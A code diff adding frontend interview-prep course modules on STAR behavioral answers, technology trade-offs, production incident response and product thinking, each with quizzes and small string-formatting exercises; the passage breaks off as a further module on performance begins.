@@ -1908,4 +1908,794 @@ const interval = setInterval(() => {
       hints: ['Use let inThrottle = false in the closure', 'If !inThrottle: call fn, set inThrottle = true, setTimeout(() => inThrottle = false, limit)', 'This is leading-edge throttle — fires immediately then blocks'],
     },
   },
+  {
+    id: 'cc-interview-fe-m09', track: 'crash', title: 'Behavioral STAR Stories for Frontend Devs',
+    subtitle: 'Turn your real projects into compelling interview answers. How to structure every "tell me about a time you…" question for frontend roles.',
+    courseObjective: CC_FE_OBJ, crashId: 'cc-interview-frontend', crashTitle: 'Frontend Interview Prep',
+    level: 'PhD', xp: 240, duration: 16, module: 9, certArea: 'Frontend Interview Prep',
+    content: `Every technical interview includes behavioral questions that trip up developers who can code but can't tell their own story. The STAR framework — Situation, Task, Action, Result — is the universal structure, but most candidates lose the result or make the action sound accidental. This module shows you how to turn your real frontend work into interview gold.
+
+## The STAR Framework for Frontend Roles
+
+**Situation** sets the stage in one sentence. Keep it lean: "Our job board had a 7-second first load on mobile." Don't explain the whole product history.
+
+**Task** clarifies your specific responsibility. "I owned the performance optimization sprint for the entire frontend." This distinguishes your role from the team's role.
+
+**Action** is the bulk of the answer — 3 to 5 concrete steps you personally took. "I ran Lighthouse, identified render-blocking fonts and a 400KB unoptimized hero image, added next/image with WebP conversion, deferred non-critical scripts with strategy='lazyOnload', and split the CSS bundle with dynamic imports." Use tool names, metric names, and exact decisions.
+
+**Result** must include a number. "LCP dropped from 7.2s to 1.8s. Mobile bounce rate fell by 34% over the following two weeks." If you don't have exact numbers, estimate: "roughly" or "approximately" is fine — "our performance improved" is not.
+
+## The Five Universal Behavioral Questions
+
+These five appear in nearly every frontend interview. Prepare a STAR answer for each before the interview:
+
+1. **Tell me about a time you improved performance.** Use a Lighthouse/Core Web Vitals story. Anchor to LCP, CLS, or FID/INP numbers.
+
+2. **Describe a situation where you had to learn something fast.** Use a framework migration or a new tool adoption. Show the learning process, not just the outcome.
+
+3. **Tell me about a conflict with a teammate.** Use a code review disagreement or a design-vs-implementation debate. The resolution matters more than the conflict.
+
+4. **Give an example of a project you're most proud of.** This is not about the biggest project — it's about the one where you made the most independent decisions. Your job board app is perfect here.
+
+5. **Tell me about a time you failed.** Interviewers are testing self-awareness. Pick something real, own it cleanly, and end with what you'd do differently.
+
+## Building Your Story Bank
+
+Map your real projects to these questions before the interview. For your job board project at jsusrpemetech.online:
+
+- Performance question → next/image, lazy loading, bundle analysis
+- Learning fast → picking up any tool you hadn't used before (Supabase Realtime, Playwright, etc.)
+- Proud project → the job board itself — explain the product decision (who it helps, why that matters)
+- Conflict → any design or technology choice you debated
+- Failure → a bug you shipped, a feature that didn't work as expected, or a missed deadline
+
+The goal is to have 5–8 STAR stories ready. Each story should be adaptable to multiple questions by emphasizing different parts.
+
+## Common Mistakes
+
+Candidates fail behavioral questions by: (1) being vague — "I improved the performance a lot"; (2) using "we" instead of "I" — the interviewer wants your contribution, not the team's; (3) skipping the result — your action means nothing without measurable impact; (4) telling a negative story without a clear resolution.
+
+Practicing out loud matters. The story sounds very different in your head versus spoken to another person. Record yourself and listen for filler words, vagueness, and missing results.`,
+    keyTerms: [
+      { term: 'STAR Framework', definition: 'Situation, Task, Action, Result — the standard structure for behavioral interview answers.' },
+      { term: 'Story Bank', definition: 'A prepared set of STAR stories mapped to common behavioral questions, ready to adapt during interviews.' },
+      { term: 'Quantified Result', definition: 'A result anchored to a specific metric (percentage, time, count) that makes impact concrete and credible.' },
+      { term: 'Contribution Clarity', definition: 'Distinguishing your individual actions from your team\'s collective work — interviewers ask about you, not the team.' },
+      { term: 'Adaptive Story', definition: 'A single STAR story flexible enough to answer multiple question types by shifting emphasis between elements.' },
+    ],
+    quiz: [
+      {
+        q: 'An interviewer asks "Tell me about a time you improved performance." You say: "We refactored our app and performance got a lot better." What is the primary problem with this answer?',
+        options: ['It is too long', 'It uses "we" and lacks a quantified result', 'It mentions refactoring instead of optimization', 'Performance is not a valid topic'],
+        correct: 1,
+        explanation: '"We" hides your individual contribution, and "a lot better" is vague — interviewers need a specific number like "LCP dropped from 6s to 1.4s".',
+      },
+      {
+        q: 'In the STAR framework, what does the Action component primarily contain?',
+        options: ['The business context and problem background', '3–5 specific steps you personally took with tool and decision names', 'The measurable outcome of the project', 'Your role title and team size'],
+        correct: 1,
+        explanation: 'Action is the largest part: concrete, sequential steps you personally took, naming specific tools, metrics, and decisions — not vague summaries.',
+      },
+      {
+        q: 'When asked "Tell me about a time you failed," the safest and most effective approach is to:',
+        options: ['Describe a failure that happened to someone else', 'Say you cannot recall a specific failure', 'Own a real failure, explain root cause, and state what you\'d do differently', 'Turn the answer into a success story immediately'],
+        correct: 2,
+        explanation: 'Interviewers use this question to test self-awareness and growth mindset. Owning a real failure, diagnosing it clearly, and articulating the lesson is the strongest answer.',
+      },
+      {
+        q: 'You have one strong project story. Which is the best way to use it across multiple behavioral questions?',
+        options: ['Only use it for the "proud project" question', 'Repeat it verbatim for every question', 'Adapt it by shifting emphasis — lead with performance for a perf question, lead with learning for a growth question', 'Create a completely different story for each question'],
+        correct: 2,
+        explanation: 'One strong project can answer multiple questions by shifting the emphasis. The core facts stay the same; which element (Situation vs Action vs Result) you expand changes.',
+      },
+    ],
+    ide: {
+      language: 'javascript',
+      task: 'Write a function `starAnswer(situation, task, action, result)` that formats a STAR answer as a structured string. Then write out a complete STAR answer object for a frontend performance improvement story — fill all four fields with realistic, specific content (tool names, metrics, numbers).',
+      starterCode: `function starAnswer(situation, task, action, result) {
+  // Return a formatted string combining all four parts
+  // Each part should be labeled and on its own section
+}
+
+// Example usage — fill this in with a real performance story
+const myPerformanceStory = starAnswer(
+  'Situation: ...',
+  'Task: ...',
+  'Action: ...',  // Include 3+ specific steps with tool names
+  'Result: ...'   // Include at least one metric/number
+)
+
+console.log(myPerformanceStory)`,
+      solution: `function starAnswer(situation, task, action, result) {
+  return \`SITUATION: \${situation}
+
+TASK: \${task}
+
+ACTION: \${action}
+
+RESULT: \${result}\`
+}
+
+const myPerformanceStory = starAnswer(
+  'Our job board homepage had a 6.8s LCP on mobile, causing high bounce rates on slower connections.',
+  'I owned the entire frontend performance sprint — no other engineers were working on it.',
+  '1) Ran Lighthouse and identified three blockers: render-blocking Google Fonts, a 420KB unoptimized hero image, and a synchronous analytics script. 2) Migrated fonts to next/font with display=swap. 3) Replaced the img tag with next/image using WebP and priority=true for above-the-fold. 4) Moved the analytics script to strategy=lazyOnload. 5) Verified with Lighthouse CI in the PR to prevent regression.',
+  'LCP dropped from 6.8s to 1.3s — below the 2.5s "Good" threshold. Mobile bounce rate fell 28% over the next two weeks based on our analytics dashboard.'
+)
+
+console.log(myPerformanceStory)`,
+      hints: ['Each STAR field should be a complete, detailed sentence or paragraph', 'The Action should list specific steps with tool names, not vague summaries', 'The Result must include at least one number — approximate is fine if exact is unknown'],
+    },
+  },
+  {
+    id: 'cc-interview-fe-m10', track: 'crash', title: 'Trade-off Articulation — Why You Chose What You Chose',
+    subtitle: 'Senior interviewers don\'t just ask what you used — they ask why. Master the framework for defending every technology choice cleanly.',
+    courseObjective: CC_FE_OBJ, crashId: 'cc-interview-frontend', crashTitle: 'Frontend Interview Prep',
+    level: 'PhD', xp: 240, duration: 15, module: 10, certArea: 'Frontend Interview Prep',
+    content: `The question "Why did you choose X instead of Y?" separates junior from senior candidates. Junior developers use what they know. Senior engineers choose what fits and can articulate why. This module teaches you to defend any frontend technology decision with a structured trade-off analysis.
+
+## The Trade-off Framework
+
+Every technology trade-off has the same structure: **Context → Criteria → Options → Decision → Tradeoffs accepted**.
+
+1. **Context**: What were you building? What constraints existed (team size, timeline, bundle size, SEO requirements)?
+2. **Criteria**: What did you need the tool to do well? Speed of development, bundle size, long-term maintainability, learning curve?
+3. **Options**: What alternatives did you consider? Name at least two.
+4. **Decision**: Which did you pick and why it best fit your criteria?
+5. **Tradeoffs accepted**: What are you giving up by making this choice? Showing you understand the downside builds more credibility than pretending your choice was perfect.
+
+## The 7 Most Common Frontend Trade-off Questions
+
+**1. Tailwind CSS vs CSS Modules vs Styled Components**
+Tailwind wins on speed of development and consistency but sacrifices semantic class names and adds HTML verbosity. CSS Modules win on encapsulation and readability but require switching between files. Styled Components add runtime cost. For a Next.js app with a small team moving fast, Tailwind is the correct default.
+
+**2. React Query vs Zustand vs Redux**
+React Query is a server-state manager, not a general state manager. Redux is global client state with time-travel debugging — correct for complex apps with many engineers. Zustand is lightweight global state without boilerplate. Most apps need React Query for async data + Zustand for UI state. Redux is overkill unless you have a large team or need middleware.
+
+**3. Next.js vs plain React (Vite)**
+Next.js wins on SEO (SSR/SSG), routing, image optimization, and production deployment. Plain React wins on simplicity for SPAs with no SEO requirements (dashboards, internal tools). For a job board with public-facing pages, Next.js is the right call.
+
+**4. useContext vs state library**
+Context re-renders everything subscribed to it on every change. Use Context for slowly-changing global data (auth user, theme). Use Zustand/Jotai for frequently-updating or performance-sensitive state.
+
+**5. REST vs GraphQL**
+REST wins for simple CRUD with clear resource boundaries. GraphQL wins when consumers have varying data needs (mobile vs web fetching different fields) or when over-fetching is a performance problem.
+
+**6. TypeScript vs JavaScript**
+TypeScript adds compile-time safety, better IDE support, and self-documenting interfaces. The cost is a slightly steeper learning curve and build step. For any project with more than one person or lasting more than a few weeks, TypeScript is always the right call.
+
+**7. Supabase vs Firebase vs custom backend**
+Supabase: open-source, PostgreSQL, row-level security, generous free tier, easier to migrate away from. Firebase: mature real-time SDK but vendor lock-in and NoSQL limitations. Custom backend: full control but much more work. For a solo or small team building a product with relational data, Supabase wins.
+
+## How to Deliver a Trade-off Answer
+
+Interviewers are not looking for the "right" answer — they're looking for *structured thinking*. A strong answer sounds like:
+
+> "I chose Tailwind CSS because our team needed to move fast and maintain visual consistency without context-switching between files. The tradeoff I accepted was verbose HTML, which I mitigated by extracting repeated utility combinations into components. I considered CSS Modules but they would have slowed us down and made design tokens harder to share."
+
+Notice: criteria named, alternative mentioned, tradeoff acknowledged.`,
+    keyTerms: [
+      { term: 'Trade-off Framework', definition: 'Context → Criteria → Options → Decision → Tradeoffs accepted — the five-step structure for defending any technology choice.' },
+      { term: 'Server State vs Client State', definition: 'Server state is data that lives on the server and must be fetched/cached (React Query). Client state is UI-only data (Zustand, Context).' },
+      { term: 'Over-fetching', definition: 'An API pattern where the response includes more data than the consumer needs, wasting bandwidth — a key motivation for GraphQL.' },
+      { term: 'Vendor Lock-in', definition: 'Dependency on a specific provider\'s proprietary features that makes migration difficult — relevant when choosing Firebase vs Supabase vs custom backend.' },
+      { term: 'Accepted Tradeoff', definition: 'The downside of your technology choice that you consciously accepted because the benefits outweighed it — stating this explicitly shows senior-level thinking.' },
+    ],
+    quiz: [
+      {
+        q: 'An interviewer asks "Why did you use Tailwind instead of CSS Modules?" The strongest answer structure is:',
+        options: ['Tailwind is simply better for all projects', 'Name your criteria, the alternative considered, your decision, and one tradeoff you accepted', 'List Tailwind features without mentioning CSS Modules', 'Say the team decided — it was not your choice'],
+        correct: 1,
+        explanation: 'Strong trade-off answers name criteria (speed, consistency), acknowledge the alternative (CSS Modules), state the decision, and honestly name one thing you gave up (verbose HTML).',
+      },
+      {
+        q: 'When should you use React Query vs Zustand?',
+        options: ['React Query for all state, Zustand is never needed', 'React Query for async server data (caching/fetching), Zustand for global client UI state', 'Zustand for server state, React Query for client state', 'They are interchangeable — pick either'],
+        correct: 1,
+        explanation: 'React Query manages server state (async fetching, caching, invalidation). Zustand manages client state (UI flags, user preferences, modal state). They complement, not replace, each other.',
+      },
+      {
+        q: 'What does acknowledging a tradeoff in your technology choice demonstrate to an interviewer?',
+        options: ['That you made a bad choice and should have picked differently', 'That you are uncertain about your decision', 'Senior-level thinking — you considered the full picture and made a deliberate choice', 'That the technology is generally inferior'],
+        correct: 2,
+        explanation: 'Saying "I accepted this tradeoff because the benefit outweighed it" shows mature engineering judgment. Pretending your choice had no downsides makes you sound inexperienced.',
+      },
+      {
+        q: 'Why is Next.js the correct choice over plain React (Vite) for a job board with public-facing listings?',
+        options: ['Next.js is always faster', 'Next.js has more npm downloads', 'Next.js SSR/SSG enables SEO indexing of job listings — Vite SPA pages are not crawled by default', 'Vite does not support TypeScript'],
+        correct: 2,
+        explanation: 'Job listings need to be indexed by Google. Next.js SSR generates HTML on the server for each page, making it crawlable. A Vite SPA returns a blank HTML shell that search engines cannot index.',
+      },
+    ],
+    ide: {
+      language: 'javascript',
+      task: 'Write a function `tradeoffDecision(context, criteria, options, decision, tradeoffsAccepted)` that formats a trade-off analysis as a structured string. Then call it to document one real technology decision from your own projects (e.g., why you chose Tailwind, Supabase, Next.js, or any other tool).',
+      starterCode: `function tradeoffDecision(context, criteria, options, decision, tradeoffsAccepted) {
+  // Format a trade-off analysis as a readable string
+}
+
+// Fill in a real decision from your project
+const myDecision = tradeoffDecision(
+  'context: what were you building and what constraints existed?',
+  'criteria: what did the tool need to do well?',
+  ['option A', 'option B'],
+  'what did you pick and why it best matched your criteria?',
+  'what did you give up by making this choice?'
+)
+
+console.log(myDecision)`,
+      solution: `function tradeoffDecision(context, criteria, options, decision, tradeoffsAccepted) {
+  return \`CONTEXT: \${context}
+
+CRITERIA: \${criteria}
+
+OPTIONS CONSIDERED: \${options.join(', ')}
+
+DECISION: \${decision}
+
+TRADEOFFS ACCEPTED: \${tradeoffsAccepted}\`
+}
+
+const myDecision = tradeoffDecision(
+  'Building a job board with public-facing listings that need SEO indexing, solo developer, 6-week timeline.',
+  'SSR for SEO, built-in routing, image optimization, and Vercel deployment integration.',
+  ['Next.js App Router', 'Vite + React SPA', 'Remix'],
+  'Next.js App Router — SSR out of the box for public pages, next/image for performance, Vercel deployment in one command, and Server Components reduce client bundle size.',
+  'Slightly higher learning curve than plain Vite, App Router is newer so some StackOverflow answers target the Pages Router. Accepted because SSR and image optimization were non-negotiable for the product.'
+)
+
+console.log(myDecision)`,
+      hints: ['Context should mention what you were building and any constraints (team size, timeline, SEO needs)', 'Decision should name why your choice best matched your specific criteria', 'Tradeoffs accepted is the differentiating field — most candidates skip this'],
+    },
+  },
+  {
+    id: 'cc-interview-fe-m11', track: 'crash', title: '3am Production Incident — Debug Under Pressure',
+    subtitle: 'Walk through a live production crisis like a senior engineer: systematic diagnosis, calm communication, fast resolution without making it worse.',
+    courseObjective: CC_FE_OBJ, crashId: 'cc-interview-frontend', crashTitle: 'Frontend Interview Prep',
+    level: 'PhD', xp: 260, duration: 17, module: 11, certArea: 'Frontend Interview Prep',
+    content: `The 3am production incident question appears in senior frontend and full-stack interviews. The format is: "Production is down / performance spiked / users can't log in. Walk me through what you do." Interviewers are not testing whether you know the answer — they're testing whether you panic or get systematic.
+
+## The Incident Response Framework (IRF)
+
+Every production incident follows the same five phases, whether it takes 10 minutes or 10 hours:
+
+**1. Assess severity and scope** (2 minutes)
+Before touching anything: what is broken, for how many users, since when? Check your error monitoring (Sentry), check analytics (are users converting?), check uptime monitor (is the site even responding?). This prevents you from fixing the wrong thing.
+
+**2. Establish a hypothesis** (3 minutes)
+What changed recently? Last deployment time? Any infrastructure changes? Feature flags toggled? The cause of 90% of production incidents is something that recently changed.
+
+**3. Isolate to confirm the hypothesis** (5–15 minutes)
+Reproduce the issue in a controlled way. Can you reproduce it in a private/incognito window? On a specific browser? For all users or a subset? Does reverting the last deploy fix it?
+
+**4. Fix or roll back** (5–30 minutes)
+The fastest fix is always a rollback if you have one. Deploy a fix only if (a) rollback isn't possible, or (b) the fix is one line and risk is minimal. Never push an untested fix to production at 3am under pressure.
+
+**5. Post-mortem** (next day)
+Document: what happened, why it wasn't caught in staging, what monitoring would have alerted you earlier, and what process change prevents this class of incident.
+
+## A Frontend Scenario Walk-Through
+
+**Scenario**: "Your LCP just spiked from 1.5s to 12s in production. It's 3am. Walk me through your response."
+
+**Assess**: Check Sentry — no new JS errors. Check Vercel deployment log — last deployment was 40 minutes ago. Check analytics — bounce rate jumped from 35% to 78%, affecting all users.
+
+**Hypothesis**: The most recent deployment introduced something that is blocking the critical rendering path. New large image? New synchronous script? Added a font?
+
+**Isolate**: Open DevTools → Network tab → filter by document and render-blocking resources. Immediately see a new 2.4MB image being loaded synchronously in the hero section. The PR added a background image directly in CSS without compression. LCP source is that image.
+
+**Fix or rollback**: Rollback the deployment immediately via Vercel dashboard (one button). Inform the team in Slack with a clear incident note: "Rolled back deployment at 3:14am due to 2.4MB uncompressed background image causing 12s LCP. Will fix and redeploy after testing tomorrow." LCP returns to 1.5s within 5 minutes of rollback.
+
+**Post-mortem**: Add a Lighthouse CI step to the PR pipeline that fails the build if LCP exceeds 2.5s. Add image size check to the deploy checklist.
+
+## What Interviewers Are Looking For
+
+1. **Systematic approach**: Did you assess before acting? Did you form a hypothesis before making changes?
+2. **Prioritization**: Did you consider rollback before a new fix? Did you know what was safe to touch at 3am?
+3. **Communication**: Would you leave the team in the dark or keep them informed with clear, factual updates?
+4. **Prevention thinking**: Did you end with what monitoring or process would prevent this next time?
+
+The candidate who says "I would start randomly changing things to see what helps" fails. The candidate who says "First I assess scope, then I form a hypothesis based on recent changes, then I isolate, then I roll back before patching" passes.
+
+## Common Frontend Production Incidents
+
+- **LCP spike**: New unoptimized image, render-blocking script, missing priority attribute on above-fold image
+- **Hydration mismatch errors (Next.js)**: Server and client rendering different HTML — often caused by date/time formatting or localStorage access in SSR
+- **Blank page in production**: JS bundle error preventing mount — check Sentry for the exact error
+- **Auth flow broken**: JWT expiry not handled, Supabase session not refreshed, middleware regex broken
+- **CSS completely unstyled**: Tailwind purge removed a class used in dynamic strings — use safelist in tailwind.config`,
+    keyTerms: [
+      { term: 'Incident Response Framework', definition: 'Assess → Hypothesis → Isolate → Fix/Rollback → Post-mortem — the five phases of systematic production incident resolution.' },
+      { term: 'Rollback', definition: 'Reverting to the previous working deployment — almost always safer than pushing a new untested fix under pressure.' },
+      { term: 'Post-mortem', definition: 'A blameless analysis after an incident documenting root cause, impact, and process changes to prevent recurrence.' },
+      { term: 'Render-blocking Resource', definition: 'A CSS, font, or JavaScript file that prevents the browser from rendering content until it fully loads — primary cause of LCP spikes.' },
+      { term: 'Hydration Mismatch', definition: 'A Next.js error when server-rendered HTML does not match client-rendered HTML, causing React to throw and re-render from scratch.' },
+    ],
+    quiz: [
+      {
+        q: 'A production site\'s bounce rate just jumped from 30% to 80%. Before changing anything, what is the most important first step?',
+        options: ['Push a hotfix immediately', 'Assess scope: how many users are affected, what is broken, and when did it start', 'Roll back the last deployment', 'Check GitHub issues for recent PRs'],
+        correct: 1,
+        explanation: 'Assessing scope before acting prevents you from fixing the wrong thing. How many users? What exactly is broken? Since when? These answers define the correct response.',
+      },
+      {
+        q: 'It\'s 3am, production is down, and you can identify the bug — it\'s in a complex section of the codebase. What is the safest action?',
+        options: ['Push a fix — you know exactly what\'s wrong', 'Roll back the last deployment, then deploy the fix tomorrow after testing', 'Disable the feature flag for that section', 'Wake up the senior engineer to review your fix'],
+        correct: 1,
+        explanation: 'Rollback is almost always safer than pushing an untested fix under pressure at 3am. Restore service first, then fix and test properly before redeploying.',
+      },
+      {
+        q: 'In Next.js, a "hydration mismatch" error most commonly happens when:',
+        options: ['A CSS file fails to load', 'The server renders HTML that is different from what React renders on the client', 'An API route returns a 500 error', 'The next/image component is used incorrectly'],
+        correct: 1,
+        explanation: 'Hydration mismatches occur when server and client produce different HTML — common causes: Date.now(), Math.random(), localStorage access, or dynamic class names that differ in SSR vs browser.',
+      },
+      {
+        q: 'What is the primary purpose of a post-mortem after a production incident?',
+        options: ['To assign blame and identify who caused the issue', 'To document what happened, why it wasn\'t caught earlier, and what process prevents recurrence', 'To evaluate whether to roll back the permanent fix', 'To inform users of the downtime in a public post'],
+        correct: 1,
+        explanation: 'A good post-mortem is blameless. Its value is the learning: root cause, detection gap, and process change. "Add Lighthouse CI to block LCP regressions" is a concrete, actionable outcome.',
+      },
+    ],
+    ide: {
+      language: 'javascript',
+      task: 'Write a function `incidentReport(title, severity, timeline, rootCause, resolution, prevention)` that formats a production incident post-mortem. Then fill it in with the LCP spike scenario from this module — use specific tool names, times, and concrete prevention steps.',
+      starterCode: `function incidentReport(title, severity, timeline, rootCause, resolution, prevention) {
+  // Format a structured post-mortem report
+}
+
+const lcpIncident = incidentReport(
+  title: '...',        // Short incident title
+  severity: '...',     // P0/P1/P2 and user impact
+  timeline: '...',     // When it started, detected, resolved
+  rootCause: '...',    // Exact technical root cause
+  resolution: '...',   // How it was fixed/rolled back
+  prevention: '...'    // Monitoring or process change
+)
+
+console.log(lcpIncident)`,
+      solution: `function incidentReport({ title, severity, timeline, rootCause, resolution, prevention }) {
+  return \`## Post-Mortem: \${title}
+
+SEVERITY: \${severity}
+
+TIMELINE: \${timeline}
+
+ROOT CAUSE: \${rootCause}
+
+RESOLUTION: \${resolution}
+
+PREVENTION: \${prevention}\`
+}
+
+const lcpIncident = incidentReport({
+  title: 'LCP spike from 1.5s to 12s — mobile bounce rate 78%',
+  severity: 'P1 — all users affected, no JS errors, site loads but extremely slowly',
+  timeline: 'Deployment at 02:31am. Detected at 03:00am via UptimeRobot alert. Rollback at 03:14am. LCP restored by 03:16am.',
+  rootCause: 'PR #47 added a 2.4MB uncompressed background image via CSS background-image. The image was not processed through next/image and loaded synchronously, blocking the critical rendering path and causing LCP to jump from 1.5s to 12.3s.',
+  resolution: 'Rolled back deployment via Vercel dashboard. Posted incident note in #eng-alerts Slack channel with root cause and ETA for fix.',
+  prevention: '1) Add Lighthouse CI GitHub Action that blocks merge if LCP > 2.5s. 2) Add image size check to PR template checklist (warn if asset > 200KB). 3) Add LCP monitoring alert in Vercel Analytics.',
+})
+
+console.log(lcpIncident)`,
+      hints: ['Prevention should be concrete and tooling-specific, not vague ("add better monitoring" is bad, "add Lighthouse CI that fails on LCP > 2.5s" is good)', 'Resolution should include communication steps, not just the technical fix', 'Timeline should include specific times for detection and resolution'],
+    },
+  },
+  {
+    id: 'cc-interview-fe-m12', track: 'crash', title: 'Product Thinking — Why You Built It, Not Just How',
+    subtitle: 'Move from "I built a job board" to "I built a job board because X, which led to Y." Product thinking is what separates hireable engineers from talented coders.',
+    courseObjective: CC_FE_OBJ, crashId: 'cc-interview-frontend', crashTitle: 'Frontend Interview Prep',
+    level: 'PhD', xp: 260, duration: 16, module: 12, certArea: 'Frontend Interview Prep',
+    content: `The single biggest gap between candidates who get offers and candidates who get rejections is product thinking. Companies don't just want engineers who can execute a spec — they want engineers who understand why the spec exists, who challenges bad specs, and who thinks about user impact before writing code.
+
+## What Product Thinking Means for an Engineer
+
+Product thinking is the ability to connect technical decisions to user outcomes. It does not require a product manager degree. It requires asking three questions before writing code:
+
+1. **Who is this for?** — Who is the actual user? What is their goal?
+2. **What problem does this solve?** — Not "what feature does this add" but what user pain does it remove?
+3. **How will I know if it worked?** — What metric changes if this is successful?
+
+An engineer who says "I added search to the job board" is describing a feature. An engineer who says "I added search because users were scrolling 3 pages to find senior roles — after adding search with role and level filters, average time-to-apply dropped from 4 minutes to 45 seconds" is demonstrating product thinking.
+
+## Re-framing Your Personal Projects
+
+For every project you have built, practice the product narrative. Your job board at jsusrpemetech.online is your primary proof point. Here is how to frame it:
+
+**Feature narrative (weak)**: "I built a job board with Next.js, Supabase, and Tailwind. It has authentication, job listings, and an application tracker."
+
+**Product narrative (strong)**: "I built a job board to solve my own problem as a job seeker — tracking applications across 15 different company portals was chaotic and I was losing track of follow-up dates. The product has three core jobs-to-be-done: discover roles that match my skills, track applications with status and notes, and prepare for interviews with saved company research. The technical choices — Next.js for SEO so listings are discoverable by Google, Supabase for auth and the application tracking schema, and Tailwind for fast iteration — were driven by the product requirements, not the other way around."
+
+Notice what changed: the problem came first, the user (you) was named, and the technical choices were justified by product requirements.
+
+## The Jobs-to-be-Done Framework
+
+JTBD (Jobs to be Done) is a product framework that describes features in terms of what job the user is hiring the product to do. It is a useful framing for interviews:
+
+> "When I [context], I want to [motivation], so I can [outcome]."
+
+Example: "When I am interviewing at multiple companies, I want to track each application's status and next action, so I can follow up at the right time and not let an opportunity fall through."
+
+This is the job your job board does. When you describe your projects in an interview, use JTBD to explain the product rationale.
+
+## Product Questions You Will Be Asked
+
+1. **"How would you prioritize adding these three features?"** — Evaluate by user impact × implementation cost. Name the highest-impact, lowest-cost item first.
+
+2. **"What metrics would you use to measure success?"** — Always have a primary metric (conversion, retention, task completion rate) and a guardrail metric (don't improve X at the expense of Y).
+
+3. **"What would you build next?"** — Shows forward thinking. Your answer should be grounded in a user problem you observed, not a technology you want to try.
+
+4. **"What would you change about your job board if you had 3 more months?"** — Perfect setup for product thinking. Connect every answer to a user problem first.
+
+## Why This Matters for Standout Candidacy
+
+Companies that dropped degree requirements did so because they want engineers who think like owners. The technical interview proves you can code. The behavioral and product thinking conversation proves you can own outcomes, not just execute tasks. Most candidates can answer the technical questions. Very few can explain *why they built what they built* in terms of user value and product decisions. That conversation is what gets you the offer.`,
+    keyTerms: [
+      { term: 'Product Thinking', definition: 'The ability to connect technical decisions to user outcomes — understanding why a feature exists before deciding how to build it.' },
+      { term: 'Jobs-to-be-Done (JTBD)', definition: 'A product framework describing features in terms of what job the user is hiring the product to perform: "When I [context], I want to [motivation], so I can [outcome]."' },
+      { term: 'Guardrail Metric', definition: 'A secondary metric you monitor to ensure improving your primary metric does not cause harm elsewhere — e.g., don\'t improve speed at the cost of error rate.' },
+      { term: 'Product Narrative', definition: 'The story of a project told from the user\'s perspective — problem first, user named, technical choices justified by product requirements.' },
+      { term: 'Owner Mentality', definition: 'Treating a project as if you are responsible for its success, not just its completion — questioning specs, measuring outcomes, and thinking beyond the current task.' },
+    ],
+    quiz: [
+      {
+        q: 'Which framing demonstrates stronger product thinking for your job board project?',
+        options: ['"I built it using Next.js 14, Supabase, and Tailwind CSS with full TypeScript."', '"I built a job board because tracking applications across 15 portals was chaotic — the app reduced my average time-to-apply from 4 minutes to 45 seconds."', '"I built it to learn full-stack development and practice with modern tools."', '"I built it following the course curriculum to demonstrate my skills."'],
+        correct: 1,
+        explanation: 'The product narrative names the user problem, the solution, and a measurable outcome. Listing tech stack or citing learning goals does not demonstrate product thinking.',
+      },
+      {
+        q: 'An interviewer asks "What metrics would you use to measure success for your job board?" The strongest answer includes:',
+        options: ['Page load time and Lighthouse score', 'Number of GitHub stars and forks', 'A primary metric (e.g., applications tracked per user) and a guardrail metric (e.g., task completion rate does not drop)', 'Monthly active users only'],
+        correct: 2,
+        explanation: 'Strong metric answers include both a primary success metric and a guardrail to prevent gaming one number at the expense of another. This shows product maturity.',
+      },
+      {
+        q: 'When asked "What would you build next in your project?", the strongest answer:',
+        options: ['Names a new technology you want to try', 'Starts with a user problem you observed, then proposes the feature', 'Lists features that would make the project more impressive on your resume', 'Says you would add more animations and micro-interactions'],
+        correct: 1,
+        explanation: '"I noticed I was still losing track of companies after the interview stage, so I\'d add a follow-up reminder system" — problem first, feature second. Technology interest alone is not a product reason.',
+      },
+      {
+        q: 'The Jobs-to-be-Done framework describes product features as:',
+        options: ['The technical implementation details and stack choices', '"When I [context], I want to [motivation], so I can [outcome]"', 'The business revenue model behind the feature', 'A prioritized list of user stories in a backlog'],
+        correct: 1,
+        explanation: 'JTBD centers on the user\'s goal and context, not the feature itself. "When I am managing 20 applications, I want status tracking, so I can follow up at the right time" is the job. The feature (status tracker) is the hire.',
+      },
+    ],
+    ide: {
+      language: 'javascript',
+      task: 'Write a function `productNarrative(problem, user, solution, metric, techJustification)` that formats a product narrative for a project. Then use it to write the product narrative for your job board project — include the user problem, who the user is, what the solution does, a success metric, and why you chose your tech stack.',
+      starterCode: `function productNarrative(problem, user, solution, metric, techJustification) {
+  // Format a product narrative as a structured string
+}
+
+// Write the product narrative for your job board
+const jobBoardNarrative = productNarrative(
+  'problem: what user pain does the product solve?',
+  'user: who experiences this pain?',
+  'solution: what does the product do to solve it?',
+  'metric: how do you know if it worked?',
+  'techJustification: how did product needs drive your tech choices?'
+)
+
+console.log(jobBoardNarrative)`,
+      solution: `function productNarrative(problem, user, solution, metric, techJustification) {
+  return \`PROBLEM: \${problem}
+
+USER: \${user}
+
+SOLUTION: \${solution}
+
+SUCCESS METRIC: \${metric}
+
+TECH JUSTIFICATION: \${techJustification}\`
+}
+
+const jobBoardNarrative = productNarrative(
+  'Tracking job applications across 15+ different company portals was chaotic — candidates lost track of follow-up dates, forgot which version of their resume they submitted, and missed time-sensitive opportunities.',
+  'Job seekers actively interviewing at multiple companies simultaneously — specifically me, as a self-taught developer managing a full search campaign.',
+  'A centralized application tracker with status stages (Applied → Interview → Offer → Rejected), notes per application, company research storage, and a dashboard showing active pipeline at a glance.',
+  'Average time-to-find-application-details dropped from ~4 minutes (searching emails and tabs) to under 10 seconds. Zero missed follow-ups after the first two weeks of use.',
+  'Next.js for SSR so public job listing pages are indexable by Google (SEO was a product requirement, not a tech preference). Supabase for auth + relational schema because application tracking data is inherently relational (users, companies, jobs, applications are separate tables with relationships). Tailwind for fast UI iteration — the product needed to be functional quickly, not beautiful slowly.'
+)
+
+console.log(jobBoardNarrative)`,
+      hints: ['The problem statement should describe user pain, not feature absence', 'The metric should be something you can actually measure — even an estimate counts', 'Tech justification should trace directly to product requirements, not "I wanted to learn X"'],
+    },
+  },
+  {
+    id: 'cc-interview-fe-m13', track: 'crash', title: 'Performance Awareness — Make It 10× Faster',
+    subtitle: '"How would you make this 10x faster?" — the senior frontend performance question. Systematic profiling, the right metrics, and concrete optimization techniques.',
+    courseObjective: CC_FE_OBJ, crashId: 'cc-interview-frontend', crashTitle: 'Frontend Interview Prep',
+    level: 'PhD', xp: 260, duration: 17, module: 13, certArea: 'Frontend Interview Prep',
